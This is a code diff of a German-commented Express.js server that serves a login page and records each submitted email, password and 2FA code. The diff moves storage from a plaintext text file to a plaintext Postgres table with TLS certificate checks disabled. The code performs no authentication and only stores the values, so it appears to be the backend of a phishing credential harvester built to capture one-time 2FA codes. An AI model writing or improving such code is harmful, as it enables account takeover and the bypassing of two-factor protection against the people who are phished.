@@ -1,34 +1,40 @@
 const express = require('express');
-const fs = require('fs');
+const { Pool } = require('pg');
 const path = require('path');
+
 const app = express();
 
-// Statische Dateien (CSS, JS, Bilder)
 app.use(express.static('public'));
-
-// JSON Body lesen
 app.use(express.json());
+
+// DB Verbindung
+const pool = new Pool({
+  connectionString: process.env.DATABASE_URL,
+  ssl: { rejectUnauthorized: false }
+});
 
 // Startseite
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Login-Daten empfangen
-app.post('/login', (req, res) => {
+// Login speichern
+app.post('/login', async (req, res) => {
   const { email, password, twofa } = req.body;
-  const line = `Email: ${email}, Passwort: ${password}, 2FA: ${twofa}\n`;
 
-  fs.appendFile(path.join(__dirname, 'logins.txt'), line, (err) => {
-    if (err) {
-      console.error('Fehler beim Speichern:', err);
-      return res.status(500).end();
-    }
+  try {
+    await pool.query(
+      'INSERT INTO logins (email, password, twofa) VALUES ($1, $2, $3)',
+      [email, password, twofa]
+    );
     res.status(200).end();
-  });
+  } catch (err) {
+    console.error('Fehler:', err);
+    res.status(500).end();
+  }
 });
 
-// Railway-Port
+// Port
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log('Server läuft auf Port ' + PORT);
